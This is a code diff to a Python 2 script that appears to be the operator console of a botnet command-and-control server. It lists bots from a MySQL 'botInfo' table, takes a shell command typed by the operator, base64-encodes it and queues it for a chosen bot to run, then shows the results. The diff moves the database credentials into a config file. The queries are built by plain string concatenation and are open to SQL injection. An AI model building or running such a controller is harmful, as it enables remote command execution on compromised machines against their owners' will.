@@ -3,28 +3,26 @@
 import MySQLdb
 import sys
 import base64
+import ConfigParser
 
-db = MySQLdb.connect(host="127.0.0.1", user="wordpress", passwd="supersecurepassword", db="command")
-cursor = db.cursor()
-
-def sendCommand(mID, osT):
+def sendCommand(mID, osT, c, db):
 	print
 	print "Send the following command to machineID: " + mID
 	selection = raw_input("$ ")
 	encodedSelection = base64.b64encode(selection)
 	if len(selection) > 1:
 		sql = "INSERT INTO botInfo (machineID, osType, httpCommand, executed) VALUES ('" + mID + "','" + osT + "','" + encodedSelection + "','N')"
-		cursor.execute(sql)
+		c.execute(sql)
 		db.commit()
 	main()
 
-def controlBot(botID):
+def controlBot(botID, cur, db):
 	while True:
 		sql = "SELECT machineID, osType, httpCommand, httpResults, executed FROM botInfo WHERE id=" + botID
-		cursor.execute(sql)
+		cur.execute(sql)
 		db.commit()
-		if (cursor.rowcount > 0):
-			for row in cursor.fetchall():
+		if (cur.rowcount > 0):
+			for row in cur.fetchall():
 				id = botID
 				machineID = row[0]
 				osType = row[1]
@@ -47,7 +45,7 @@ def controlBot(botID):
 			print "Q. Return to Main"
 			selection = raw_input(id+"$ ")
 			if (selection == 'I') | (selection == 'i'):
-				sendCommand(machineID, osType)
+				sendCommand(machineID, osType, cur, db)
 			elif (selection == 'Q') | (selection == 'q'):
 				main()
 			else:
@@ -58,6 +56,14 @@ def controlBot(botID):
 
 
 def main():
+	config = ConfigParser.ConfigParser()
+	config.read("config.ini")
+	myHost = config.get('Database', 'dbHost')
+	myUser = config.get('Database', 'dbUser')
+	myPass = config.get('Database', 'dbPass')
+	myDB = config.get('Database', 'dbName')
+	db = MySQLdb.connect(host=myHost, user=myUser, passwd=myPass, db=myDB)
+	cursor = db.cursor()
 	while True:
 		print 
 		print "Select the number preceding the botID or the following options:"
@@ -74,7 +80,7 @@ def main():
 					httpResultsExist="Y"
 				else:
 					httpResultsExist="N"
-				print str(id) + ". BotID:" + machineID + " C:" + httpCommand + " R:" + httpResultsExist
+				print str(id) + ". BotID:" + machineID + " Command:" + httpCommand + " Results Exist:" + httpResultsExist
 		print
 		print "R. Refresh"
 		print "Q. Quit"
@@ -84,7 +90,10 @@ def main():
 		elif (selection == 'R') | (selection == 'r'):
 			continue
 		else:
-			controlBot(selection)
+			controlBot(selection, cursor, db)
+	cursor.close()
+	del cursor
+	db.close()
 
 if __name__ == "__main__":
         main()
